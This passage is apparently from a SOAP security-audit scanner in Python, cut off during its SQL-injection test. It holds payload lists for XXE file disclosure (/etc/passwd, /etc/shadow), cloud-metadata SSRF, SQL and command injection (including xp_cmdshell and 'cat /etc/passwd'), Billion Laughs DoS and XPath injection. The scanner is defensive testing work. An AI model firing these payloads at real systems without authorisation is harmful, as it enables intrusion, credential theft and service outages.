# core/soap_scanner.py
"""
SOAPScanner — Professional SOAP security audit engine.

Tests implemented  : SOAP-01 through SOAP-12  (12/12)
Detection approach : baseline-first — every active test establishes a normal
                     response before injecting payloads, eliminating the
                     false-positive class caused by keyword presence alone.

Architecture rules (enforced throughout):
  - Zero metadata hardcoded in the scanner — everything in soap_vulns.json.
  - _vuln() is the single ScanResult factory.
  - WsdlState carries WSDL/operation context across all test methods.
  - Timeout-aware helpers detect time-based blind injections.

WSDL dependency matrix:
  SOAP-01 wsdl           → probes live; populates WsdlState on success
  SOAP-02 xxe            → schema-independent; always runs
  SOAP-03 sqli           → schema-independent; uses generic parameter names
  SOAP-04 injection      → schema-independent; baseline-vs-payload diff
  SOAP-05 auth           → schema-independent; token strip + restore
  SOAP-06 replay         → schema-independent; expired-timestamp probe
  SOAP-07 action_spoofing→ uses WSDL ops if available, else hardcoded list
  SOAP-08 cmd_injection  → schema-independent; OS-agnostic separators
  SOAP-09 xml_dos        → schema-independent; Billion Laughs + oversized
  SOAP-10 xpath_injection→ schema-independent; XPath error signal detection
  SOAP-11 fault_disclosure→ schema-independent; malformed-request probes
  SOAP-12 bola           → schema-independent; sequential ID enumeration
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Optional

from core.models    import ScanResult
from core.requester import Requester
from core.vuln_db   import VulnDB
from logger.logger  import logger


# ─────────────────────────────────────────────────────────────────────────────
#  Knowledge-base singleton
# ─────────────────────────────────────────────────────────────────────────────

_soapdb = VulnDB("soap")


# ─────────────────────────────────────────────────────────────────────────────
#  Constants — WSDL discovery paths
# ─────────────────────────────────────────────────────────────────────────────

WSDL_PATHS: list[str] = [
    "?wsdl", "?WSDL", "?wsdl=1",
    "/wsdl", "/wsdl/",
    "/service?wsdl", "/Service?wsdl",
    "/api?wsdl", "/api/wsdl",
    "/soap?wsdl", "/soap/wsdl",
    "/ws?wsdl",   "/ws/wsdl",
    "/services?wsdl", "/services/wsdl",
    "/.svc?wsdl", "/.asmx?wsdl",
    "/WebService.asmx?wsdl",
    "/Service.svc?wsdl",
]

SOAP_FALLBACK_PATHS: list[str] = [
    "/soap", "/ws", "/service", "/services",
    "/api/soap", "/webservice", "/endpoint",
    "/ServiceEndpoint", "/WebService",
]

# Operations that strongly suggest privilege escalation opportunities
_HIGH_RISK_OP_KEYWORDS: list[str] = [
    "admin", "delete", "remove", "reset", "transfer", "update",
    "create", "grant", "revoke", "disable", "enable", "promote",
    "elevate", "setpassword", "changepassword", "setrole", "assignrole",
    "listall", "getall", "export", "backup", "restore", "configure",
]


# ─────────────────────────────────────────────────────────────────────────────
#  SOAP envelope builder
# ─────────────────────────────────────────────────────────────────────────────

def _envelope(body: str, ns: str = "http://example.com/webservice",
              version: str = "1.1") -> str:
    """Wrap a body fragment in a minimal SOAP envelope."""
    env_ns = (
        "http://www.w3.org/2003/05/soap-envelope"
        if version == "1.2"
        else "http://schemas.xmlsoap.org/soap/envelope/"
    )
    return (
        '<?xml version="1.0" encoding="utf-8"?>'
        f'<soapenv:Envelope xmlns:soapenv="{env_ns}" xmlns:web="{ns}">'
        "<soapenv:Header/>"
        f"<soapenv:Body>{body}</soapenv:Body>"
        "</soapenv:Envelope>"
    )


# ─────────────────────────────────────────────────────────────────────────────
#  Payload libraries
# ─────────────────────────────────────────────────────────────────────────────

# SOAP-02 — XXE ---------------------------------------------------------------

_XXE_PAYLOADS: list[tuple[str, str]] = [
    # (label, full_envelope)
    (
        "file:///etc/passwd",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ELEMENT soap:Envelope ANY>'
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>&xxe;</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
    (
        "file:///etc/shadow",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ELEMENT soap:Envelope ANY>'
        '<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>&xxe;</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
    (
        "file:///windows/win.ini",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ELEMENT soap:Envelope ANY>'
        '<!ENTITY xxe2 SYSTEM "file:///windows/win.ini">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>&xxe2;</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
    (
        "file:///proc/self/environ",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ELEMENT soap:Envelope ANY>'
        '<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>&xxe;</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
    (
        "WEB-INF/web.xml",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ELEMENT soap:Envelope ANY>'
        '<!ENTITY xxe SYSTEM "file:///WEB-INF/web.xml">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>&xxe;</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
    (
        "SSRF-AWS-metadata",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ENTITY % remote SYSTEM "http://169.254.169.254/latest/meta-data/">'
        '%remote;]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>test</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
    (
        "SSRF-GCP-metadata",
        '<?xml version="1.0" encoding="utf-8"?>'
        '<!DOCTYPE soap:Envelope ['
        '<!ENTITY % remote SYSTEM "http://metadata.google.internal/computeMetadata/v1/">'
        '%remote;]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body><web:getData><value>test</value></web:getData></soapenv:Body>"
        "</soapenv:Envelope>",
    ),
]

_XXE_FILE_SIGNALS: list[str] = [
    # /etc/passwd
    "root:x:0:0", "root:x:", "daemon:x:", "nobody:x:",
    "www-data:x:", "apache:x:", "/bin/bash", "/bin/sh", "/usr/sbin/nologin",
    # /etc/shadow
    "root:$", "root:!", "$6$", "$1$", "$2y$",
    # win.ini
    "[fonts]", "[extensions]", "[mci extensions]", "[mail]", "[boot loader]",
    # web.xml / config
    "web-app", "servlet-class", "context-param", "datasource",
    # proc/self/environ
    "PATH=", "HOME=", "USER=", "PWD=", "JAVA_HOME=",
    # AWS metadata
    "ami-id", "instance-id", "public-hostname", "local-hostname",
    "iam/security-credentials",
    # GCP metadata
    "computeMetadata", "project-id", "service-accounts",
]

_XXE_NETWORK_SIGNALS: list[str] = [
    "connection refused", "network unreachable",
    "name or service not known", "no route to host",
    "connection timed out", "failed to open stream",
    "unable to connect", "could not resolve",
    "connection reset", "refused to connect",
]

# SOAP-03 — SQLi --------------------------------------------------------------

# Error-based payloads (trigger visible DB error)
_SQLI_ERROR_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
    "' OR ''='",
    '" OR "1"="1"--',
    "' OR 1=1#",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; SELECT 1--",
    "&apos; OR &apos;1&apos;=&apos;1",
    "&#39; OR &#39;1&#39;=&#39;1",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
]

# Boolean-based blind payloads (true vs false condition)
_SQLI_BOOL_TRUE:  list[str] = ["' AND '1'='1", "' AND 1=1--",  "1 AND 1=1"]
_SQLI_BOOL_FALSE: list[str] = ["' AND '1'='2", "' AND 1=2--",  "1 AND 1=2"]

# Time-based blind payloads (artificial delay)
_SQLI_TIME_PAYLOADS: list[str] = [
    "' AND SLEEP(4)--",
    "'; WAITFOR DELAY '0:0:4'--",
    "1; SELECT SLEEP(4)--",
    "' OR SLEEP(4)--",
    "' AND 1=(SELECT 1 FROM (SELECT SLEEP(4))a)--",
    "'; exec master..xp_cmdshell 'ping -n 4 127.0.0.1'--",
    "' OR pg_sleep(4)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(4))--",
]

_SQLI_TIME_THRESHOLD = 3.5  # seconds — response delay indicating time-based blind

_SQLI_ERROR_SIGNALS: list[str] = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql", "mysql_fetch", "mysql_num_rows",
    "supplied argument is not a valid mysql",
    # PostgreSQL
    "pg_query()", "pg_exec()", "unterminated quoted string",
    "pgsql error", "postgresql", "pg_sleep",
    # Oracle
    "ora-01756", "ora-00933", "ora-00907", "ora-01000",
    "oracle error", "oracle driver",
    # MSSQL
    "microsoft ole db", "odbc sql server",
    "sqlsrv_query", "mssql_query",
    "incorrect syntax near", "unclosed quotation mark",
    "sqlstate[", "native client",
    # SQLite
    "sqlite3", "sqliteexception", "sqlite error",
    # DB2
    "db2 sql error", "com.ibm.db2",
    # Generic
    "sql syntax", "invalid query",
    "syntax error near", "column count doesn",
    "unterminated string", "jdbc", "hibernate",
    "sql command not properly ended",
    "division by zero", "odbc driver",
    "warning: pg_",
]

# SOAP-04 — XML Injection ------------------------------------------------------

# (label, value to inject into a string parameter)
_XML_INJECTION_VALUES: list[tuple[str, str]] = [
    ("tag-close + extra-op",
     "alice</username><role>admin</role><username>alice"),
    ("tag-close + dup-element",
     "bob</username></web:createUser><web:createUser><username>attacker"),
    ("CDATA-injection",
     "<![CDATA[</username><role>admin</role><username>]]>"),
    ("attribute-escape",
     'alice" role="admin" extra="'),
    ("entity-injection",
     "&lt;role&gt;admin&lt;/role&gt;"),
    ("comment-injection",
     "alice<!--<role>user</role>--><role>admin</role>"),
    ("processing-instruction",
     "alice<?role admin?>"),
]

# SOAP-05 — Auth ---------------------------------------------------------------

_AUTH_ERROR_SIGNALS: list[str] = [
    "unauthorized", "authentication required",
    "access denied", "ws-security", "wssecurity",
    "forbidden", "not authorized", "mustunderstand",
    "invalid security", "authentication failed",
    "invalid token", "token expired",
    "invalid credential", "security token",
    "wsse:invalidSecurity", "wsse:FailedAuthentication",
]

# SOAP-07 — SOAPAction spoofing -----------------------------------------------

_DEFAULT_SOAP_ACTIONS: list[str] = [
    # camelCase
    "getAdminData", "deleteUser", "resetPassword", "getSecretKey",
    "listAllUsers", "createAdmin", "updateRole", "disableUser",
    "getPrivateKey", "transferFunds", "changePassword", "exportData",
    "backupDatabase", "restoreDatabase", "executeQuery", "runReport",
    # PascalCase
    "GetAdminData", "DeleteUser", "ResetPassword", "GetSecretKey",
    "ListAllUsers", "CreateAdmin", "UpdateRole", "DisableUser",
    "TransferFunds", "ChangePassword", "ExportData",
    # snake_case
    "get_admin_data", "delete_user", "reset_password",
    "list_all_users", "create_admin", "update_role",
    # Namespace-prefixed
    "Admin.GetData", "Admin.DeleteUser", "Admin.ResetPassword",
    "IAdminService/GetData", "IUserService/Delete",
]

# SOAP-08 — Command injection --------------------------------------------------

_CMD_SEPARATORS: list[str] = [";", "&&", "||", "|", "&", "\n", "`"]

_CMD_PAYLOADS: list[tuple[str, str]] = [
    # (label, command suffix — appended to a valid-looking input)
    ("semicolon-ls",           "; ls"),
    ("semicolon-id",           "; id"),
    ("semicolon-whoami",       "; whoami"),
    ("semicolon-cat-passwd",   "; cat /etc/passwd"),
    ("semicolon-uname",        "; uname -a"),
    ("ampersand-whoami",       "& whoami"),
    ("ampersand-dir",          "& dir"),           # Windows
    ("pipe-id",                "| id"),
    ("pipe-whoami",            "| whoami"),
    ("and-id",                 "&& id"),
    ("backtick-id",            "`id`"),
    ("dollar-id",              "$(id)"),
    ("newline-id",             "\nid"),
    ("ping-loopback",          "; ping -c 1 127.0.0.1"),
    ("ping-win",               "& ping -n 1 127.0.0.1"),
]

_CMD_SUCCESS_SIGNALS: list[str] = [
    # id / whoami output
    "uid=", "gid=", "groups=", "root", "www-data", "apache", "nginx",
    # ls output
    "bin", "usr", "etc", "var", "home", "tmp", "lib",
    # Windows dir
    "volume in drive", "directory of", "bytes free",
    # uname
    "linux", "darwin", "freebsd", "gnu/linux",
    # ping output
    "bytes from", "icmp_seq", "ttl=", "time=",
    "packets transmitted", "reply from",
    # /etc/passwd
    "root:x:", "daemon:x:", "/bin/bash",
]

_CMD_TEST_INPUT = "127.0.0.1"   # valid-looking value to prepend payloads to

# SOAP-09 — XML DoS ------------------------------------------------------------

_XML_DOS_BILLION_LAUGHS = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE lolz ['
    '<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
    '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
    '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
    ']>'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
    "<soapenv:Header/>"
    "<soapenv:Body><web:getData><value>&lol5;</value></web:getData></soapenv:Body>"
    "</soapenv:Envelope>"
)

_XML_DOS_QUAD_BLOWUP = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE q [<!ENTITY a "' + ("a" * 50_000) + '">]>'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
    "<soapenv:Header/>"
    "<soapenv:Body>"
    "<web:getData>" + "<n>&a;</n>" * 20 + "</web:getData>"
    "</soapenv:Body>"
    "</soapenv:Envelope>"
)

def _xml_dos_deep_nesting(depth: int = 300) -> str:
    """Generate a SOAP envelope with deeply nested elements."""
    open_tags  = "".join(f"<l{i}>" for i in range(depth))
    close_tags = "".join(f"</l{i}>" for i in range(depth - 1, -1, -1))
    return (
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        "<soapenv:Header/>"
        "<soapenv:Body>"
        f"<web:getData>{open_tags}value{close_tags}</web:getData>"
        "</soapenv:Body>"
        "</soapenv:Envelope>"
    )

def _xml_dos_oversized(size_kb: int = 512) -> str:
    """Generate an oversized SOAP payload."""
    padding = "A" * (size_kb * 1024)
    return _envelope(f"<web:getData><value>{padding}</value></web:getData>")

_DOS_TIME_THRESHOLD = 4.0  # seconds

# SOAP-10 — XPath injection ---------------------------------------------------

_XPATH_PAYLOADS: list[str] = [
    "' or '1'='1",
    "' or ''='",
    "\" or \"1\"=\"1",
    "x' or name()='username' or 'x'='y",
    "' or count(parent::*[position()=1])=0 or 'a'='b",
    "' or count(parent::*[position()=1])>0 or 'a'='b",
    "'] | //* | /descendant::*['",
    "' or local-name()='password' or '",
    "admin' or '1' = '1",
    "' or 1=1 or ''='",
    "x') or (1=1 and 'x'='x",
]

_XPATH_ERROR_SIGNALS: list[str] = [
    "xmlquery", "xpath", "xpathexception",
    "invalid expression", "unterminated string constant",
    "org.apache.xpath", "javax.xml.xpath",
    "net.sf.saxon", "com.sun.org.apache.xpath",
    "xalan", "jaxp", "xmlpathexception",
    "xpath error", "invalid xpath",
    "expected token", "xpath function",
    "expression is not a valid xpath",
]

# SOAP-11 — Fault disclosure --------------------------------------------------

# Malformed envelopes designed to trigger Fault responses
_FAULT_PROBES: list[tuple[str, str]] = [
    ("missing-body-element",
     '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
     "<soapenv:Header/><soapenv:Body/></soapenv:Envelope>"),
    ("wrong-namespace",
     '<soapenv:Envelope xmlns:soapenv="http://WRONG/soap/envelope/">'
     "<soapenv:Header/>"
     "<soapenv:Body><getData><value>test</value></getData></soapenv:Body>"
     "</soapenv:Envelope>"),
    ("malformed-xml",
     '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
     "<soapenv:Header/>"
     "<soapenv:Body><getData><value>test</value></WRONG_CLOSE></soapenv:Body>"
     "</soapenv:Envelope>"),
    ("empty-action",
     _envelope("<web:NonExistentOperation999><id>1</id></web:NonExistentOperation999>")),
    ("type-mismatch",
     _envelope("<web:getUser><userId>NOT_AN_INTEGER</userId></web:getUser>")),
]

_FAULT_TECH_SIGNALS: list[str] = [
    # Java stack trace signatures
    "at com.", "at org.", "at java.", "at sun.", "at javax.",
    "exception in thread", "nullpointerexception",
    "caused by:", "stack trace:", "java.lang.",
    # .NET stack trace
    "at system.", "at microsoft.", "server error in",
    "asp.net", "system.web", "system.xml",
    # Framework/version disclosure
    "apache cxf", "axis2", "jboss", "glassfish", "weblogic",
    "tomcat", "jetty", "spring framework",
    "wcf", ".net framework", "iis/", "apache/",
    "php/", "python/", "ruby",
    # DB query fragments
    "select ", "insert into", "update set", "delete from",
    "from information_schema", "where ", "join ",
    # File path disclosure
    "/opt/", "/var/www/", "/usr/local/",
    "c:\\inetpub", "c:\\windows", "d:\\www",
    # Internal service names
    "internal server error at",
    "com.example.", "com.company.", "org.internal.",
]

# SOAP-12 — BOLA/IDOR ---------------------------------------------------------

_BOLA_PARAM_NAMES: list[str] = [
    "userId", "user_id", "accountId", "account_id",
    "recordId", "record_id", "customerId", "customer_id",
    "patientId", "patient_id", "orderId", "order_id",
    "id", "ID", "Id",
]

_BOLA_GENERIC_OPS: list[str] = [
    "getUser", "GetUser", "getUserById", "GetUserById",
    "getAccount", "GetAccount", "getRecord", "GetRecord",
    "getOrder", "GetOrder", "getProfile", "GetProfile",
    "viewUser", "fetchUser", "retrieveUser",
]


# ─────────────────────────────────────────────────────────────────────────────
#  WsdlState
# ─────────────────────────────────────────────────────────────────────────────

class WsdlStatus(Enum):
    AVAILABLE = auto()
    BLOCKED   = auto()
    UNKNOWN   = auto()


@dataclass
class WsdlState:
    """Carries WSDL availability and parsed data across all test methods."""
    status:          WsdlStatus    = WsdlStatus.UNKNOWN
    wsdl_url:        Optional[str] = None
    operations:      list[str]     = field(default_factory=list)
    high_risk_ops:   list[str]     = field(default_factory=list)
    raw:             Optional[str] = None

    @property
    def available(self) -> bool:
        return self.status == WsdlStatus.AVAILABLE

    @property
    def source_label(self) -> str:
        return {
            WsdlStatus.AVAILABLE: f"available ({self.wsdl_url})",
            WsdlStatus.BLOCKED:   "blocked",
            WsdlStatus.UNKNOWN:   "not yet probed",
        }[self.status]

    def parse_operations(self, body: str) -> None:
        """Extract all operation names and flag high-risk ones.

        A WSDL often declares the same operation multiple times across
        different bindings (SOAP 1.1, SOAP 1.2, HTTP).  We deduplicate
        while preserving order so the evidence stays clean.
        """
        raw = re.findall(
            r'<(?:wsdl:)?operation\s+name=["\']([^"\']+)["\']', body
        )
        # Deduplicate preserving insertion order
        seen: set[str] = set()
        self.operations = []
        for op in raw:
            if op not in seen:
                seen.add(op)
                self.operations.append(op)
        low = [op.lower() for op in self.operations]
        self.high_risk_ops = [
            op for op, lo in zip(self.operations, low)
            if any(kw in lo for kw in _HIGH_RISK_OP_KEYWORDS)
        ]


# ─────────────────────────────────────────────────────────────────────────────
#  ScanResult factory — single point of creation
# ─────────────────────────────────────────────────────────────────────────────

def _vuln(
    name:       str,
    endpoint:   str,
    method:     str,
    evidence:   str,
    payload:    Optional[str] = None,
    parameter:  Optional[str] = None,
    extra_desc: Optional[str] = None,
) -> ScanResult:
    """
    Build a fully-populated ScanResult from soap_vulns.json.
    No static metadata lives in this file — all comes from the JSON.
    """
    meta = _soapdb.get(name)
    desc = meta.get("description", f"Vulnerability: {name}")
    if extra_desc:
        desc = f"{desc} | {extra_desc}"
    return ScanResult(
        vuln_id     = meta.get("id",         f"SOAP-??"),
        vuln_type   = meta.get("label",       name),
        severity    = meta.get("severity",    "MEDIUM"),
        confidence  = meta.get("confidence",  "MEDIUM"),
        owasp       = meta.get("owasp",       "API8:2023 - Security Misconfiguration"),
        cwe         = meta.get("cwe",         "CWE-200"),
        endpoint    = endpoint,
        method      = method,
        parameter   = parameter,
        payload     = payload,
        evidence    = evidence,
        description = desc,
        solution    = meta.get("solution",    "See OWASP Web Service Security Testing Guide."),
        reference   = meta.get("reference",   "https://owasp.org/www-project-web-security-testing-guide/"),
    )


# ─────────────────────────────────────────────────────────────────────────────
#  SOAPScanner
# ─────────────────────────────────────────────────────────────────────────────

class SOAPScanner:
    """
    Professional SOAP security audit engine — 12 test categories.

    Usage:
        scanner = SOAPScanner(base_url="https://api.example.com", timeout=8)
        results = scanner.scan(endpoints, tests=["wsdl", "xxe", "sqli"])
    """

    _TEST_REGISTRY: dict[str, str] = {
        "wsdl":           "_test_wsdl_exposure",
        "xxe":            "_test_xxe",
        "sqli":           "_test_sqli",
        "injection":      "_test_xml_injection",
        "auth":           "_test_broken_auth",
        "replay":         "_test_replay",
        "action_spoofing":"_test_action_spoofing",
        "cmd_injection":  "_test_cmd_injection",
        "xml_dos":        "_test_xml_dos",
        "xpath_injection":"_test_xpath_injection",
        "fault_disclosure":"_test_fault_disclosure",
        "bola":           "_test_bola",
    }

    def __init__(
        self,
        base_url: str,
        timeout:  int            = 8,
        token:    Optional[str]  = None,
        schema:   Optional[dict] = None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout  = timeout
        self.http     = Requester(self.base_url, timeout=timeout)
        self._wsdl    = WsdlState()
        if token:
            self.http.set_token(token)

    # =========================================================================
    #  Public entry point
    # =========================================================================

    def scan(
        self,
        endpoints: list[str],
        tests:     Optional[list[str]] = None,
    ) -> list[ScanResult]:
        """Run selected vulnerability tests against SOAP endpoints."""
        active: dict[str, callable] = {}
        if tests is None:
            active = {n: getattr(self, m) for n, m in self._TEST_REGISTRY.items()}
        else:
            for name in tests:
                if name in self._TEST_REGISTRY:
                    active[name] = getattr(self, self._TEST_REGISTRY[name])

        if not active:
            logger.info("[SOAP] No applicable tests — skipped.")
            return []

        soap_endpoints = self._resolve_endpoints(endpoints)
        if not soap_endpoints:
            logger.warning("[SOAP] No SOAP endpoints found — skipped.")
            return []

        logger.info(
            f"[*] SOAP scan — {len(soap_endpoints)} endpoint(s) | "
            f"WSDL: {self._wsdl.source_label} | "
            f"tests: {list(active.keys())}"
        )

        results: list[ScanResult] = []
        for endpoint in soap_endpoints:
            for test_name, test_fn in active.items():
                try:
                    found = test_fn(endpoint)
                    results.extend(found)
                except Exception as exc:
                    logger.debug(f"    [soap:{test_name}] unhandled error: {exc}")

        logger.info(f"[+] SOAP scan complete — {len(results)} finding(s)")
        return results

    # =========================================================================
    #  SOAP-01 — WSDL Exposure
    # =========================================================================

    def _test_wsdl_exposure(self, endpoint: str) -> list[ScanResult]:
        """
        Probe 16 common WSDL path patterns.
        On success: populate WsdlState, enumerate high-risk operations,
        include them in the evidence for immediate actionable context.
        """
        base = endpoint.rstrip("/")

        for suffix in WSDL_PATHS:
            url  = f"{base}{suffix}"
            path = self._rel(url)
            r    = self.http.get(path)
            if r is None or r.status_code != 200:
                continue
            body = r.text or ""
            if not self._is_wsdl(body):
                continue

            # Populate shared state
            self._wsdl.status   = WsdlStatus.AVAILABLE
            self._wsdl.wsdl_url = url
            self._wsdl.raw      = body
            self._wsdl.parse_operations(body)

            n     = len(self._wsdl.operations)
            risky = self._wsdl.high_risk_ops
            ops_label = (
                f"{n} operation(s): " + ", ".join(self._wsdl.operations[:6])
                + ("…" if n > 6 else "")
            ) if n else "no operations parsed"
            risk_label = (
                f"HIGH-RISK operations detected: {', '.join(risky)}"
                if risky else "no high-risk operations flagged"
            )

            logger.info(f"    [VULN] SOAP-01 WSDL → {url} | {ops_label} | {risk_label}")
            return [_vuln(
                name       = "wsdl",
                endpoint   = url,
                method     = "GET",
                payload    = suffix,
                evidence   = (
                    f"WSDL accessible without auth at {url}. "
                    f"{ops_label}. {risk_label}."
                ),
                extra_desc = (
                    f"Full service contract exposed: {ops_label}. "
                    f"{risk_label}. "
                    "Restricting WSDL access removes the attacker's reconnaissance blueprint."
                ),
            )]

        if self._wsdl.status == WsdlStatus.UNKNOWN:
            self._wsdl.status = WsdlStatus.BLOCKED
            logger.info(f"    [INFO] SOAP-01 — WSDL not accessible on {endpoint}")
        return []

    # =========================================================================
    #  SOAP-02 — XXE Injection
    # =========================================================================

    def _test_xxe(self, endpoint: str) -> list[ScanResult]:
        """
        7 XXE payloads covering:
          - Linux file disclosure (/etc/passwd, /etc/shadow, /proc/self/environ)
          - Windows file disclosure (win.ini)
          - Java config disclosure (WEB-INF/web.xml)
          - SSRF to AWS EC2 metadata
          - SSRF to GCP metadata
        Detection: file content signals in response body (high confidence).
        Fallback: network-error signals for SSRF blind (medium confidence).

        Anti-FP rule: if the signal appears inside a SOAP Fault that merely
        echoes back the payload URL, it is NOT a real XXE — the server just
        reflected our input in the error message.  We strip the Fault text
        before checking for signals.
        """
        path = self._rel(endpoint)

        for label, payload in _XXE_PAYLOADS:
            r = self._soap_post(path, payload)
            if r is None:
                continue
            body = r.text or ""

            # ── Anti-FP: remove Fault echo before signal check ────────────────
            # A Fault that merely echoes the entity URL is not evidence of
            # successful entity resolution — it is just input reflection.
            body_for_check = body
            if "<Fault" in body or "<fault" in body or "faultstring" in body.lower():
                # Strip everything inside <faultstring>…</faultstring> so that
                # a URL echoed in the error message does not match our signals
                body_for_check = re.sub(
                    r"<[^>]*faultstring[^>]*>.*?</[^>]*faultstring[^>]*>",
                    "",
                    body,
                    flags=re.IGNORECASE | re.DOTALL,
                )

            # Primary: file/metadata content in the non-Fault part of response
            hit = next(
                (s for s in _XXE_FILE_SIGNALS if s.lower() in body_for_check.lower()),
                None,
            )
            if hit:
                excerpt = self._ctx(body, hit, 150)
                logger.info(f"    [VULN] SOAP-02 XXE ({label}) → {endpoint} | signal: {hit!r}")
                return [_vuln(
                    name       = "xxe",
                    endpoint   = endpoint,
                    method     = "POST",
                    payload    = label,
                    evidence   = (
                        f"XXE confirmed via {label}. "
                        f'File content signal "{hit}" found outside Fault body. '
                        f'Excerpt: "{excerpt}"'
                    ),
                    extra_desc = f"Target: {label}. Parser resolves external entities.",
                )]

            # Fallback: SSRF blind — network error implies entity resolution attempted
            # Apply the same anti-FP rule: ignore errors inside Fault strings
            if "SSRF" in label:
                net_hit = next(
                    (s for s in _XXE_NETWORK_SIGNALS if s in body_for_check.lower()),
                    None,
                )
                if net_hit:
                    logger.info(f"    [VULN] SOAP-02 XXE SSRF-blind ({label}) → {endpoint}")
                    return [_vuln(
                        name       = "xxe",
                        endpoint   = endpoint,
                        method     = "POST",
                        payload    = label,
                        evidence   = (
                            f"XXE SSRF blind confirmed. "
                            f'Network error "{net_hit}" outside Fault body — '
                            f"indicates entity resolution attempt. Target: {label}."
                        ),
                        extra_desc = (
                            "Parser attempted to resolve external HTTP entity — "
                            "enables SSRF against internal services and cloud metadata."
                        ),
                    )]
        return []

    # =========================================================================
    #  SOAP-03 — SQL Injection
    # =========================================================================

    def _test_sqli(self, endpoint: str) -> list[ScanResult]:
        """
        Three-technique SQLi detection following SecureLayer7 methodology:

        1. Error-based  — inject payload, detect DB error string in response.
        2. Boolean-blind — compare true-condition vs false-condition response
                           body and status; significant diff = injection.
        3. Time-based   — measure response time delta; delay > threshold
                           confirms blind injection even with no visible output.

        Baseline is established first so parameter names and normal response
        are known before any injection attempt.
        """
        path = self._rel(endpoint)

        # ── Baseline ──────────────────────────────────────────────────────────
        baseline_env  = _envelope("<web:getUser><userId>1</userId></web:getUser>")
        r_base        = self._soap_post(path, baseline_env)
        base_body     = (r_base.text or "") if r_base else ""
        base_status   = r_base.status_code if r_base else 200
        base_len      = len(base_body)

        # ── Technique 1 — Error-based ─────────────────────────────────────────
        for payload in _SQLI_ERROR_PAYLOADS:
            env = _envelope(
                "<web:getUser>"
                f"<userId>{payload}</userId>"
                f"<username>{payload}</username>"
                f"<search>{payload}</search>"
                f"<filter>{payload}</filter>"
                "</web:getUser>"
            )
            r = self._soap_post(path, env)
            if r is None:
                continue
            body_low = (r.text or "").lower()
            hit = next((s for s in _SQLI_ERROR_SIGNALS if s in body_low), None)
            if hit:
                excerpt = self._ctx(r.text or "", hit, 150)
                logger.info(
                    f"    [VULN] SOAP-03 SQLi error-based → {endpoint} | "
                    f"payload: {payload!r} | signal: {hit!r}"
                )
                return [_vuln(
                    name      = "sqli",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = payload,
                    parameter = "userId / username / search / filter",
                    evidence  = (
                        f"Error-based SQLi confirmed. "
                        f'DB error signal "{hit}" in response. '
                        f'Excerpt: "{excerpt}"'
                    ),
